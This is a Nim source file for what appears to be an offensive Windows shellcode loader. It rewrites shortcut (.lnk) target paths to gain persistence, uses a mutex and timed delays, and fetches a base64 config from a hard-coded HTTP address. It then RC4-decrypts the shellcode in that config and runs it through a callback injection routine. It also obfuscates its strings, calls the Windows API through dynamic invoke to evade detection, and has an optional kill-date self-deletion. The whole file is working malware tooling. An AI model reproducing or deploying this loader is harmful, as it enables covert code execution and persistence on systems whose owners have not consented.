#[
  - Change the address for where the config will be hosted, add a proxy, SSL/TLS support etc.,
    this is just for testing.

  - Delay period between shortcut target path changes set to 90 seconds, change if needed.
]#

import core/lnks
import core/static_strs
import nimvoke/syscalls
import nimvoke/dinvoke
import tables, parsetoml, strutils

from base64 import decode 
from streams import readAll
from core/rc_for import frcDec
from core/injection import callBack
from core/util import toByteSeq, convertSeconds
from httpclient import newHttpClient, newHttpHeaders, request
from os import fileExists, removeFile, splitFile, getAppFilename
from winim/lean import NTSTATUS, BOOLEAN, LARGE_INTEGER, WINBOOL, LPCSTR, NULL, FALSE, HANDLE, ERROR_ALREADY_EXISTS,
                       LPSECURITY_ATTRIBUTES, GetLastError, CloseHandle

when defined suicide:
  import suicide

let #[ Edit this ]#
  executionDelay: int64 = 50 # Delay time between path resets in seconds
  mutexName: string = jam("Global\\DumbMutexLol")
  address: string = jam("http://10.0.0.5:8080/method_1_config.b64")
  usrAgentStr: string = jam("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240")
  usrAgent: string = jam("user-agent")

var
  hMutex: HANDLE
  ntds: NTSTATUS
  alertable: BOOLEAN = 0 
  delayInterval: LARGE_INTEGER

dinvokeDefine(
  NtDelayExecution,
  "ntdll.dll",
  proc (Alertable: BOOLEAN, DelayInterval: ptr LARGE_INTEGER): NTSTATUS {.stdcall.}
)

dinvokeDefine(
  CreateMutexA, 
  "kernel32.dll",
  proc (lpMutexAttributes: LPSECURITY_ATTRIBUTES,
        bInitialOwner: WINBOOL,
        lpName: LPCSTR): HANDLE {.stdcall.}
)

proc checkMtx(): bool = 
  hMutex = CreateMutexA(NULL, FALSE, mutexName.cstring)
  if GetLastError() == ERROR_ALREADY_EXISTS:
    return false 
  return true 

proc getRequest(url: string, header={usrAgent: usrAgentStr}): string =
  var 
    client = newHttpClient()
    reqHeaders = newHttpHeaders(header)
    data = client.request(url, headers=reqHeaders)

  return data.bodyStream.readAll()

when isMainModule:
  delayInterval.QuadPart = -convertSeconds(executionDelay)

  let #[ Get the current name/path of the loader ]#
    exePath = getAppFilename()
    (payloadPath, name, ext) = splitFile(exePath)
    payloadName = name & ext

  if not checkMtx():
    restoreOrigLnkPaths()
    ntds = NtDelayExecution(alertable, addr(delayInterval))
    modifyAllLnkPaths(payloadPath, payloadName)
    CloseHandle(hMutex)
    quit(QuitSuccess)

  else:
    #[ Get data from the config ]#
    let data = getRequest(address)
    var configTable = initTable[string, string]()

    let decodedData = decode(data)
    var config = parsetoml.parseString(decodedData)

    configTable[jam("key")]        = config[jam("key")][jam("rc4_key")].getStr()
    configTable[jam("shellCode")]  = config[jam("shellcode")][jam("shell_code")].getStr()
    configTable[jam("killDate")]   = config[jam("self_delete")][jam("kill_date")].getStr()

    let
      key: string          = configTable[jam("key")]
      encShellCode: string = configTable[jam("shellCode")]
      killDate: string     = configTable[jam("killDate")]

    #[ If the date is at or over the kill date, clean up and exit ]#
    when defined suicide:
      let 
        datefmt: string = jam("yyyy-MM-dd")
        currentDate = getTime().format(datefmt)

      if currentDate >= killDate:
        if fileExists(delayPath):
          removeFile(delayPath)
        restoreOrigLnkPaths()
        suicide.sDelete()

    restoreOrigLnkPaths()
    ntds = NtDelayExecution(alertable, addr(delayInterval))
    modifyAllLnkPaths(payloadPath, payloadName)

    var decodedSC: string = decode(encShellCode)
    var decryptedSC = frcDec(key, decodedSC)
    var uShellCode: seq[byte] = toByteSeq(decryptedSC)
    callBack(uShellCode)